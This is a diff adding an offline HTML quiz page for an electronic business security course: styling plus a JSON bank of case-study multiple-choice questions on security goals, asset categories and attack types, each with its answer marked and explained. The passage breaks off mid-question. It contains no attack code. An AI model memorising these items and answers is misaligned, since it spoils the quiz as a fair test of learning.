@@ -1,0 +1,2772 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Electronic Business Security Case-Study Question Bank</title>
+  <style>
+    :root {
+      --bg: #f4f7fb;
+      --panel: #ffffff;
+      --text: #172033;
+      --muted: #62708a;
+      --line: #dbe3ef;
+      --primary: #2457d6;
+      --primary-dark: #173fa5;
+      --primary-soft: #e9efff;
+      --good: #16794c;
+      --good-bg: #e8f7ef;
+      --bad: #b42318;
+      --bad-bg: #fff0ed;
+      --shadow: 0 14px 35px rgba(24, 39, 75, 0.10);
+      --radius: 16px;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(36, 87, 214, 0.12), transparent 32rem),
+        radial-gradient(circle at top right, rgba(22, 121, 76, 0.08), transparent 28rem),
+        var(--bg);
+      line-height: 1.5;
+    }
+
+    .page {
+      width: min(1180px, calc(100% - 32px));
+      margin: 0 auto;
+      padding: 28px 0 64px;
+    }
+
+    .hero {
+      background: linear-gradient(135deg, #182747 0%, #2457d6 58%, #2c8fdd 100%);
+      color: white;
+      border-radius: 24px;
+      padding: 34px;
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      position: relative;
+    }
+    .hero::after {
+      content: "";
+      position: absolute;
+      width: 280px;
+      height: 280px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.09);
+      right: -90px;
+      top: -90px;
+    }
+    .hero h1 {
+      margin: 0 0 8px;
+      font-size: clamp(1.8rem, 4vw, 3rem);
+      line-height: 1.08;
+      letter-spacing: -0.03em;
+    }
+    .hero p {
+      max-width: 780px;
+      margin: 0;
+      color: rgba(255,255,255,0.88);
+      font-size: 1rem;
+    }
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 20px;
+      position: relative;
+      z-index: 1;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      border: 1px solid rgba(255,255,255,0.22);
+      border-radius: 999px;
+      background: rgba(255,255,255,0.12);
+      backdrop-filter: blur(10px);
+      font-weight: 700;
+      font-size: 0.88rem;
+      white-space: nowrap;
+    }
+
+    .toolbar {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      margin: 22px 0;
+      padding: 14px;
+      background: rgba(244, 247, 251, 0.90);
+      backdrop-filter: blur(14px);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      box-shadow: 0 8px 26px rgba(24, 39, 75, 0.08);
+    }
+    .tabs {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+    .tab {
+      appearance: none;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      background: var(--panel);
+      color: var(--text);
+      padding: 12px 13px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: transform .16s ease, border-color .16s ease, background .16s ease, color .16s ease;
+      text-align: left;
+      min-height: 62px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .tab small {
+      display: block;
+      margin-top: 4px;
+      color: var(--muted);
+      font-weight: 700;
+      font-size: 0.76rem;
+    }
+    .tab:hover { transform: translateY(-1px); border-color: #b8c7ef; }
+    .tab.active {
+      background: var(--primary);
+      color: white;
+      border-color: var(--primary);
+    }
+    .tab.active small { color: rgba(255,255,255,0.84); }
+
+    .controls {
+      display: grid;
+      grid-template-columns: 1fr auto auto;
+      gap: 10px;
+      align-items: center;
+    }
+    .search {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      background: white;
+      color: var(--text);
+      padding: 12px 14px;
+      font: inherit;
+      outline: none;
+    }
+    .search:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(36,87,214,.12); }
+    .stat, .btn {
+      border: 1px solid var(--line);
+      background: white;
+      border-radius: 13px;
+      padding: 11px 14px;
+      font-weight: 850;
+      color: var(--text);
+      white-space: nowrap;
+      font-size: 0.94rem;
+    }
+    .btn { cursor: pointer; }
+    .btn:hover { border-color: #b8c7ef; background: #fbfcff; }
+    .btn.primary { background: var(--primary); border-color: var(--primary); color: white; }
+    .btn.primary:hover { background: var(--primary-dark); }
+
+    .summary {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: center;
+      justify-content: space-between;
+      margin: 20px 0 14px;
+    }
+    .summary h2 {
+      margin: 0;
+      font-size: clamp(1.25rem, 2.5vw, 1.7rem);
+      letter-spacing: -0.02em;
+    }
+    .progress-wrap {
+      min-width: min(360px, 100%);
+      flex: 1;
+      margin-left: 12px;
+    }
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      color: var(--muted);
+      font-weight: 800;
+      font-size: 0.84rem;
+      margin-bottom: 7px;
+    }
+    .progress {
+      height: 10px;
+      background: #e7edf6;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+    .progress > span {
+      display: block;
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), #28a46a);
+      border-radius: inherit;
+      transition: width .25s ease;
+    }
+
+    .questions {
+      display: grid;
+      gap: 16px;
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      box-shadow: 0 10px 26px rgba(24, 39, 75, 0.06);
+      padding: 22px;
+      transition: transform .16s ease, box-shadow .16s ease, border-color .16s ease;
+    }
+    .card:hover {
+      transform: translateY(-1px);
+      box-shadow: var(--shadow);
+      border-color: #cbd7ec;
+    }
+    .q-meta {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    .topic-pill {
+      display: inline-flex;
+      align-items: center;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: var(--primary-soft);
+      color: var(--primary-dark);
+      font-size: 0.78rem;
+      font-weight: 800;
+      letter-spacing: 0.01em;
+    }
+    .case-box {
+      background: #f6f9ff;
+      border-left: 4px solid var(--primary);
+      border-radius: 10px;
+      padding: 13px 15px;
+      margin-bottom: 14px;
+      color: #24324d;
+      font-size: 0.95rem;
+      white-space: pre-wrap;
+    }
+    .case-label {
+      display: block;
+      font-size: 0.72rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--primary);
+      margin-bottom: 4px;
+    }
+    .q-head {
+      display: flex;
+      gap: 13px;
+      align-items: flex-start;
+      margin-bottom: 14px;
+    }
+    .q-num {
+      flex: 0 0 auto;
+      width: 40px;
+      height: 40px;
+      display: grid;
+      place-items: center;
+      border-radius: 12px;
+      background: var(--primary-soft);
+      color: var(--primary);
+      font-weight: 950;
+    }
+    .q-text { margin: 0; font-size: 1.04rem; font-weight: 820; padding-top: 7px; }
+
+    .options {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 10px;
+    }
+    .option {
+      appearance: none;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      background: #fbfcff;
+      color: var(--text);
+      padding: 13px 14px;
+      cursor: pointer;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      text-align: left;
+      font: inherit;
+      transition: background .16s ease, border-color .16s ease, transform .16s ease;
+    }
+    .option:hover { background: #f4f7ff; border-color: #b8c7ef; transform: translateY(-1px); }
+    .letter {
+      flex: 0 0 auto;
+      width: 28px;
+      height: 28px;
+      display: grid;
+      place-items: center;
+      border-radius: 9px;
+      background: #e9eef8;
+      color: #41506a;
+      font-weight: 950;
+      font-size: .88rem;
+      margin-top: 1px;
+    }
+    .card.answered .option { cursor: default; }
+    .card.answered .option:hover { transform: none; }
+    .option.correct {
+      background: var(--good-bg);
+      border-color: rgba(22, 121, 76, 0.42);
+      color: var(--good);
+    }
+    .option.correct .letter { background: var(--good); color: white; }
+    .option.incorrect {
+      background: var(--bad-bg);
+      border-color: rgba(180, 35, 24, 0.35);
+      color: var(--bad);
+    }
+    .option.incorrect .letter { background: var(--bad); color: white; }
+    .option.dim { opacity: .64; }
+
+    .feedback {
+      display: none;
+      margin-top: 14px;
+      border-radius: 13px;
+      padding: 14px 15px;
+      border: 1px solid;
+    }
+    .feedback.show { display: block; }
+    .feedback.good { background: var(--good-bg); border-color: rgba(22, 121, 76, 0.32); color: #0e5737; }
+    .feedback.bad { background: var(--bad-bg); border-color: rgba(180, 35, 24, 0.28); color: #842018; }
+    .feedback strong { display: block; margin-bottom: 4px; }
+    .feedback .explanation { margin: 0; }
+    .card-actions { margin-top: 12px; display: flex; justify-content: flex-end; }
+    .show-answer {
+      border: 0;
+      background: transparent;
+      color: var(--primary);
+      font-weight: 900;
+      cursor: pointer;
+      padding: 6px 0;
+    }
+    .show-answer:hover { color: var(--primary-dark); text-decoration: underline; }
+
+    .empty {
+      padding: 44px 18px;
+      text-align: center;
+      background: var(--panel);
+      border: 1px dashed #bfcbe0;
+      border-radius: var(--radius);
+      color: var(--muted);
+      font-weight: 800;
+    }
+
+    .footer {
+      margin-top: 28px;
+      color: var(--muted);
+      font-size: .92rem;
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+
+    @media (max-width: 880px) {
+      .tabs { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .controls { grid-template-columns: 1fr; }
+      .stat { text-align: center; }
+      .progress-wrap { margin-left: 0; min-width: 100%; }
+    }
+    @media (max-width: 640px) {
+      .page { width: min(100% - 20px, 1180px); padding-top: 14px; }
+      .hero { padding: 24px 20px; border-radius: 19px; }
+      .tabs { grid-template-columns: 1fr; }
+      .options { grid-template-columns: 1fr; }
+      .card { padding: 17px; }
+      .summary { align-items: stretch; flex-direction: column; }
+    }
+
+    @media print {
+      body { background: white; }
+      .toolbar, .card-actions, .footer .no-print { display: none !important; }
+      .page { width: 100%; padding: 0; }
+      .hero { color: black; background: white; border: 1px solid #ddd; box-shadow: none; }
+      .hero p, .badge { color: #333; }
+      .card { break-inside: avoid; box-shadow: none; }
+      .feedback { display: block !important; color: black; background: white; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <section class="hero">
+      <h1>Electronic Business Security Case-Study Bank</h1>
+      <p>Select a unit module, read the scenario, choose an answer, and immediately see whether it is correct with an explanation. All 160 case-study questions across Units 2–5 are contained in this single offline HTML file.</p>
+      <div class="badges">
+        <span class="badge">4 Unit Modules</span>
+        <span class="badge">160 Case-Study Questions</span>
+        <span class="badge">Answers + Explanations</span>
+        <span class="badge">Offline &amp; Saved Progress</span>
+      </div>
+    </section>
+
+    <section class="toolbar" aria-label="Quiz controls">
+      <div class="tabs" id="tabs"></div>
+      <div class="controls">
+        <input class="search" id="search" type="search" placeholder="Search case studies, questions, options, or explanations in the current unit…" aria-label="Search current unit" />
+        <div class="stat" id="score" aria-live="polite">Score: 0/40</div>
+        <button class="btn primary" id="reset" type="button">Reset unit</button>
+      </div>
+    </section>
+
+    <section class="summary">
+      <h2 id="moduleTitle"></h2>
+      <div class="progress-wrap">
+        <div class="progress-label"><span id="answeredLabel">0 answered</span><span id="percentLabel">0%</span></div>
+        <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+      </div>
+    </section>
+
+    <section class="questions" id="questions" aria-live="polite"></section>
+
+    <footer class="footer">
+      <span>Electronic Business Security · Dr. John Kwao Dawson · Units 2, 3, 4 &amp; 5 Consolidated Question Bank.</span>
+      <button class="btn no-print" type="button" onclick="window.scrollTo({top:0,behavior:'smooth'})">Back to top</button>
+    </footer>
+  </main>
+
+  <script id="quiz-data" type="application/json">{
+  "UNIT 2 — Electronic Business Security": [
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "MediCare Plus, an online pharmacy in Kumasi, stores patients' prescription records on its e-commerce platform. Its new IT policy states that only the attending pharmacist and the patient may view a prescription, and each patient can decide which medical researchers may access their anonymized records.",
+      "question": "Which security goal does this policy primarily implement?",
+      "options": [
+        "Availability — the records must be ready whenever a pharmacist logs in",
+        "Confidentiality — private information is not disclosed to unauthorized persons, and patients control who may access their data",
+        "System integrity — the prescription system must not be manipulated",
+        "Accountability — every access must be traceable to a unique user"
+      ],
+      "answer": 1,
+      "explanation": "The slides define confidentiality as ensuring that private or confidential information is not made available or disclosed to unauthorized persons, and that people have the authority to control which information about them is collected and stored and who may access it — ensuring the privacy of individuals. That is exactly what MediCare Plus's policy implements."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "At AgroMart, a junior clerk was able to change the price of a bag of maize from GHS 350 to GHS 3.50 on the live website, because the change-approval form was optional and nobody reviewed the edit.",
+      "question": "Which security goal was directly violated?",
+      "options": [
+        "Authenticity",
+        "Integrity — specifically data integrity",
+        "Confidentiality",
+        "Availability"
+      ],
+      "answer": 1,
+      "explanation": "Integrity encompasses data integrity: both information and programs must be changed only in a manner specified by the authority concerned. A price record was altered without the required authorization, so the data-integrity goal was breached."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "RuralBank's core banking system was patched by a maintenance vendor who quietly re-programmed it so that interest calculations silently rounded in the vendor's favour. The system kept running — but it was no longer performing its intended, unimpaired function.",
+      "question": "Which specific security objective did this incident breach?",
+      "options": [
+        "Availability — the system went down",
+        "Accountability — the vendor denied the act",
+        "Data integrity — the record contents were edited",
+        "System integrity — the system no longer performs its intended function free from unauthorized manipulation"
+      ],
+      "answer": 3,
+      "explanation": "System integrity is defined as ensuring that a system performs its intended function in an unimpaired manner, free from deliberate or inadvertent unauthorized manipulation of the system. The vendor's secret re-programming is precisely such a manipulation of system behaviour."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "During the Black Friday sale, ShopZed's e-commerce servers crashed under load, and for six hours paying customers could not place orders, track deliveries or reach support.",
+      "question": "Which security objective did the outage directly harm?",
+      "options": [
+        "Availability",
+        "Confidentiality",
+        "Integrity",
+        "Authenticity"
+      ],
+      "answer": 0,
+      "explanation": "Availability means computing systems provide prompt and efficient service to authorized users without denying them the service when needed. A six-hour outage denied service to legitimate (paying) users, so availability was the objective harmed."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "In a lecture on e-commerce security, Dr. Dawson tells the class: 'CIA alone is not enough. When a customer opens your web app, you must also be able to ascertain that the entity communicating with you is genuinely who it claims to be.'",
+      "question": "Which additional security objective is the lecturer describing?",
+      "options": [
+        "Authenticity",
+        "Accessibility",
+        "Authorization",
+        "Auditability"
+      ],
+      "answer": 0,
+      "explanation": "Security experts add authenticity to the classic CIA objectives. Authenticity is the ability to ascertain that users who access a computing system or communicate over a network are who they say they are — it involves the genuineness, verifiability and trust of communicating partners or users of a computing facility."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "After a data breach at GhanaRide, forensic investigators used audit logs to prove that exactly one dispatch account had cancelled 4,000 ride bookings — and the intern who owned that account could not deny his actions when confronted with the log trail.",
+      "question": "Which security objective made this unique tracing and non-denial possible?",
+      "options": [
+        "Authenticity",
+        "Accountability",
+        "Confidentiality",
+        "Availability"
+      ],
+      "answer": 1,
+      "explanation": "Accountability is the ability to trace the actions of a user of computing assets uniquely to that user, such that the user cannot repudiate or deny taking the actions when faced with the forensic evidence of the trail of his actions."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "A newly appointed CISO at MomoPay writes in her welcome memo: 'Security in this company means the measures and controls we apply to protect our information-system assets — our hardware, software, firmware, the information we process, store and communicate, and our tools.'",
+      "question": "Which triad of objectives does this definition of security centre on?",
+      "options": [
+        "Prevention, Detection, Recovery",
+        "Privacy, Profitability, Performance",
+        "Control, Identification, Authentication",
+        "Confidentiality, Integrity, Availability"
+      ],
+      "answer": 3,
+      "explanation": "The course defines security as measures and controls aimed at the confidentiality, integrity and availability (CIA) of information-system assets — hardware, software, firmware, information processed, stored and communicated, and tools."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "TrendHub, an online fashion store, collects shoppers' browsing histories. Its privacy policy allows a shopper to demand that the marketing department not access her profile, and to choose which analytics partners may use her data.",
+      "question": "In terms of the course's security goals, this control over personal information reflects which aspect of confidentiality?",
+      "options": [
+        "Authenticity — the shopper must be genuine",
+        "The privacy of individuals — people have the authority to control which information about them is collected and stored, and who may access it",
+        "System integrity — the profile database must stay unimpaired",
+        "Availability — the profile must always be online"
+      ],
+      "answer": 1,
+      "explanation": "The slides state that confidentiality also implies that people are given the authority to control which kind of information about them may be collected and stored and who may access such information. This means ensuring the privacy of individuals."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "During an online auction on BidGh, bids were placed from the account 'kofi_asante' — but the real Kofi Asante had not logged in that day; a rival had guessed his password and was bidding in his name.",
+      "question": "Which security objective failed at the point of login?",
+      "options": [
+        "Availability — Kofi could not bid",
+        "Authenticity — the platform could not ascertain that the user was who he claimed to be",
+        "Data integrity — the bids were modified",
+        "Accountability — no logs existed"
+      ],
+      "answer": 1,
+      "explanation": "Authenticity is the ability to ascertain that users who access a computing system or communicate over a network are who they say they are. BidGh accepted a password-holder as 'kofi_asante' without verifying the genuine identity of the communicating party, so authenticity failed."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "CloudLearn, an e-learning portal, never actually crashes; but during examination weeks pages take up to five minutes to load, and thousands of students effectively cannot submit their work in time.",
+      "question": "How do security experts classify this situation?",
+      "options": [
+        "An integrity breach, because records were altered",
+        "An availability problem — availability requires prompt and efficient service, not merely a running system",
+        "Not a security issue at all, since the system never went down",
+        "A confidentiality breach, because exam answers were exposed"
+      ],
+      "answer": 1,
+      "explanation": "Availability is defined as computing systems providing prompt and efficient service to authorized users without denying them the service when needed. Extremely slow service denies effective availability even when the system technically stays up."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "FreshMart's order database was hit by ransomware one week before Christmas: the attackers encrypted the data and demanded payment. FreshMart refused to pay and restored everything from backups, but a full day of orders was lost while the systems were locked.",
+      "question": "In the classification of security goals, what was the PRIMARY objective under attack?",
+      "options": [
+        "Authenticity — the attackers impersonated staff",
+        "Accountability — the attackers erased the logs",
+        "Availability — the attackers denied the shop and its staff access to data and service when needed",
+        "Confidentiality — the attackers published customer data"
+      ],
+      "answer": 2,
+      "explanation": "Ransomware works by denying the legitimate owner access to data or systems until a demand is met. Denying authorized users their data and service is fundamentally an attack on availability."
+    },
+    {
+      "topic": "Module 1 · Security Foundations & the Goals of Security",
+      "case": "The board of the eGov Portal questions why the security team insists on unique user IDs and full action logging for every civil servant, given the login friction it creates. The security chief answers that this objective also 'discourages attackers and helps us isolate incidents.'",
+      "question": "According to the course, what else does accountability provide besides unique tracing of actions?",
+      "options": [
+        "It guarantees one hundred percent uptime",
+        "It deters intruders from accessing the system and enables security experts to isolate attacks and provide intrusion detection and prevention mechanisms",
+        "It automatically encrypts all data at rest",
+        "It removes the need for firewalls and patching"
+      ],
+      "answer": 1,
+      "explanation": "The slides state that accountability will deter intruders from accessing the system and enable security experts to isolate attacks and provide intrusion detection and prevention mechanisms — exactly the benefit the security chief described."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "An auditor at Zebra Logistics is drawing up the company's computing-asset register. She lists: (i) 400 handheld delivery-tracker devices, (ii) the routing system's operating system, (iii) the customer database files, and (iv) the Wi-Fi bridges and routers linking the warehouses.",
+      "question": "In the course's categorization of computing assets, the handheld delivery-tracker devices belong to which category?",
+      "options": [
+        "Hardware",
+        "Software",
+        "Data",
+        "Communication facilities and networks"
+      ],
+      "answer": 0,
+      "explanation": "Hardware includes all physical devices associated with the computing platform. The handheld trackers are physical devices, so they are hardware assets."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "Kantamanto Online runs an online marketplace. Its asset list includes the cooling unit in the server room, the marketplace web-application code, customers' delivery addresses stored in the database, and the fibre link to the ISP.",
+      "question": "Which item on that list is a SOFTWARE asset?",
+      "options": [
+        "The marketplace web-application code",
+        "The customers' delivery addresses",
+        "The fibre link to the ISP",
+        "The server-room cooling unit"
+      ],
+      "answer": 0,
+      "explanation": "Software includes both system software (operating systems, system utilities) and application software of different kinds. The marketplace application is application software; the cooling unit is hardware, the addresses are data, and the fibre link is a communication facility."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "A security researcher demonstrates that she can recover the secret encryption key from SecureSIM smart cards simply by measuring how much electrical power the card's processor consumes while it encrypts.",
+      "question": "In the course's mapping of asset categories to example attacks, this side-channel attack is listed against which asset category?",
+      "options": [
+        "Data",
+        "Communication facilities and networks",
+        "Hardware",
+        "Software"
+      ],
+      "answer": 2,
+      "explanation": "The slides list side-channel attacks and glitching as examples of attacks on hardware — the physical devices of the computing platform. Power-consumption analysis of a smart-card processor is a classic hardware side-channel attack."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "BusyInternet's security operations centre reports two simultaneous incidents: machines across the office are infected with Conficker, and several users' banking sessions show Zeus malware stealing credentials.",
+      "question": "In the course's asset–threat mapping, malware such as Zeus and Conficker are listed as example attacks on which asset category?",
+      "options": [
+        "Communication facilities and networks",
+        "Hardware",
+        "Software",
+        "Data"
+      ],
+      "answer": 2,
+      "explanation": "The slides list SQL injection, cross-site scripting, malware (Zeus, Conficker) and DDoS as examples of attacks on software — the system software and application software of the computing platform."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "A clerk at PayGh receives an email that looks like it came from her IT department, clicks the link, and types her username and password into a fake site. Her credentials are captured and her account is emptied.",
+      "question": "Phishing, as classified in the course, is an example attack against which asset category?",
+      "options": [
+        "Hardware",
+        "Software",
+        "Data — including security-related data such as passwords",
+        "Communication facilities and networks"
+      ],
+      "answer": 2,
+      "explanation": "The slides group phishing with ransomware (WannaCry), man-in-the-middle and credential stuffing as example attacks on data — files and databases, as well as security-related data such as password files. The phished password is exactly such security-related data."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "During an incident drill, the red team completely encrypts Chase Gh's customer files with WannaCry-style ransomware and demands cryptocurrency for the decryption key.",
+      "question": "Ransomware such as WannaCry is listed in the course as an example attack on which asset category?",
+      "options": [
+        "Hardware",
+        "System software only",
+        "Routers and bridges",
+        "Data — files and databases"
+      ],
+      "answer": 3,
+      "explanation": "The course lists ransomware (WannaCry) among the example attacks on data — files and databases, including security-related data such as password files."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "Zebra Logistics' asset register must also classify the bridges, the routers, and the local- and wide-area network communication links that connect the warehouses to head office.",
+      "question": "Which asset category do these items belong to?",
+      "options": [
+        "Data",
+        "Firmware updates",
+        "Communication facilities and networks",
+        "Application software"
+      ],
+      "answer": 2,
+      "explanation": "The course's fourth asset category is communication facilities and networks — the local and wide area network communication links, bridges, and routers."
+    },
+    {
+      "topic": "Module 2 · Computing Assets & Their Threats",
+      "case": "In the same breach drill at Chase Gh, the red team also exfiltrated the password file from the web server — the file that stores users' password hashes.",
+      "question": "How does the course classify a password file?",
+      "options": [
+        "As a communication facility",
+        "As data — specifically security-related data",
+        "As hardware",
+        "As application software"
+      ],
+      "answer": 1,
+      "explanation": "The data asset category includes files and databases as well as security-related data, such as password files. A password hash file is security-related data, hence a data asset."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "A quarterly security report for MyGhShop states: 'The unpatched mail server COULD be exploited to read internal correspondence. So far, no exploitation has been observed.'",
+      "question": "In the course's terminology, what is the described 'possibility of harm' called, and what would it become if someone actually carried it out?",
+      "options": [
+        "A vulnerability; a countermeasure",
+        "A threat; an attack (threat action)",
+        "An attack; a threat consequence",
+        "A countermeasure; a control"
+      ],
+      "answer": 1,
+      "explanation": "A threat can be defined as potential security harm to any computer asset. An attack, on the other hand, is a threat that is carried out (a threat action) and, if successful, leads to threat consequences detrimental to the organization's operational security."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "In court, the prosecutor describes 'the individual or group that launched the credential-stuffing raid on MyGhShop's login page in March.'",
+      "question": "What term does the course use for the entity that carries out an attack?",
+      "options": [
+        "Countermeasure",
+        "Vulnerability",
+        "Data custodian",
+        "Threat agent (attacker)"
+      ],
+      "answer": 3,
+      "explanation": "The entity carrying out the attack is referred to as an attacker or threat agent."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "Network monitoring at GhanaAir shows that an intruder has attached a capture device to the cabin-crew LAN and is quietly reading passenger-manifest traffic in transit. Nothing is altered and no system's behaviour changes.",
+      "question": "How is this activity classified?",
+      "options": [
+        "An insider attack, by definition",
+        "A denial-of-service attack",
+        "An active attack — system resources are being modified",
+        "A passive attack — the attacker studies or makes use of information without affecting the system's operation"
+      ],
+      "answer": 3,
+      "explanation": "A passive attack is an attempt to study or make use of information from the system such that the operation of the system is not affected. Capturing and reading traffic without altering anything is passive eavesdropping."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "During a flash sale, the marketplace DealGh is flooded with millions of fake requests until the site cannot serve real shoppers at all.",
+      "question": "By the active/passive classification, a denial-of-service attack is which type — and why?",
+      "options": [
+        "Neither active nor passive",
+        "Passive, because no data is read",
+        "Active, because it modifies system resources so as to affect their operation",
+        "Passive, because the attacker only observes"
+      ],
+      "answer": 2,
+      "explanation": "Active attacks are attempts to modify system resources to affect their operation; the slides list man-in-the-middle, denial-of-service and ransomware attacks as examples. A DoS flood disrupts the operation of the target, so it is active."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "The WannaCry outbreak of 2017 encrypted hundreds of thousands of machines' files and demanded payment — changing the state of the victims' systems before anyone paid a cent.",
+      "question": "By the active/passive classification, ransomware is which type of attack?",
+      "options": [
+        "Active — it modifies system resources (encrypting files) to affect their operation",
+        "Passive — it only reads files",
+        "Passive — because it merely demands payment",
+        "Not classifiable as an attack"
+      ],
+      "answer": 0,
+      "explanation": "Ransomware modifies system resources — encrypting data — to affect their operation and deny service. The slides explicitly list ransomware attacks among active attacks."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "A disgruntled database administrator at TrustBank uses the legitimate, authorized access his job gives him to silently copy the entire customer table to a USB stick two weeks before resigning.",
+      "question": "By the ORIGIN of the attack, how is this classified?",
+      "options": [
+        "An insider attack — initiated by an entity inside the organization who is authorized to access the resources but uses them maliciously",
+        "A passive attack — and therefore not an insider matter",
+        "A side-channel attack",
+        "An outsider attack — he was about to leave the company anyway"
+      ],
+      "answer": 0,
+      "explanation": "An insider attack is initiated by an entity inside the organization that owns the computing assets; the insider is authorized to access system resources but uses them maliciously for personal motive. That is exactly what the DBA did. (Origin and effect are two separate classifications.)"
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "A criminal-hacker group operating from another continent, with no authorization of any kind, breaks into the GhanaRevenue e-filing portal.",
+      "question": "By origin, what type of attack is this?",
+      "options": [
+        "A glitching attack",
+        "A social-engineering attack",
+        "An insider attack",
+        "An outsider attack — initiated by an entity outside the organization, not authorized to access its computing assets"
+      ],
+      "answer": 3,
+      "explanation": "An outsider attack is initiated by an entity from outside the organization that owns the computing resources; such an entity is not authorized to access the computing assets. The slides name terrorists and criminal hackers as examples of such attackers."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "A trainee asks the security lead to explain the essential difference between insider and outsider attacks in one sentence.",
+      "question": "Which answer is correct, according to the course?",
+      "options": [
+        "Outsiders always use ransomware",
+        "Insider attacks are always passive; outsider attacks are always active",
+        "An insider is authorized to access system resources but uses them maliciously; an outsider is not authorized to access the assets at all",
+        "Insiders attack hardware; outsiders attack software"
+      ],
+      "answer": 2,
+      "explanation": "The slides define the insider as an entity inside the organization who is authorized to access system resources but uses them maliciously for personal motive, whereas the outsider is an entity from outside who is not authorized to access the computing assets at all."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "An attacker positions a capture device between MobileMoney app users and the operator's gateway, harvesting transaction details and PINs as they flow past. He never alters a single message.",
+      "question": "Even though nothing is modified, which security goal is directly endangered by this eavesdropping?",
+      "options": [
+        "Confidentiality — private information is being made available to an unauthorized person",
+        "Integrity — the messages are being changed",
+        "Availability — the gateway is overloaded",
+        "Accountability — the attacker hides his identity"
+      ],
+      "answer": 0,
+      "explanation": "Passive eavesdropping does not modify data, but it makes private or confidential information available to an unauthorized person — a direct breach of confidentiality."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "In a Zeus-malware incident at a small bank, the trojan secretly modified online transaction records so that money was redirected to mule accounts.",
+      "question": "Which security goal do such active, modification-oriented attacks characteristically breach?",
+      "options": [
+        "Confidentiality — the records were merely read",
+        "Authenticity — the users were genuine",
+        "Availability — the records were deleted",
+        "Integrity — information is changed other than in the manner specified by the authority concerned"
+      ],
+      "answer": 3,
+      "explanation": "Active attacks attempt to modify system resources to affect their operation. Data integrity requires that information and programs are changed only in a manner specified by the authority concerned — the unauthorized modification of transaction records breaches that integrity."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "After a successful DDoS on K12Learn's platform, the site was unusable for a whole day, parents demanded refunds, and the brand suffered lasting reputational damage.",
